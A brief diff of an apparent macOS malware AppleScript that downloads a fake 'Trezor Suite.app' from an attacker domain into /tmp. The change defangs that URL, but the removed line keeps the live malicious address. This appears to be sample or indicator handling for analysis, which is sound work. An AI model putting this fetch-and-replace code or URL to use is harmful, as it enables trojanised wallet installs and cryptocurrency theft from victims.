@@ -782,7 +782,7 @@ if ledger_installed then
 
 
 
-set TREZORURL to "https://ballfrank.today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
+set TREZORURL to "hxxps[://]ballfrank[.]today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
 set TREZORDMGPATH to "/tmp/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
 set TREZORMOUNT to "/tmp"
 set TREZORNAME to "Trezor Suite.app"
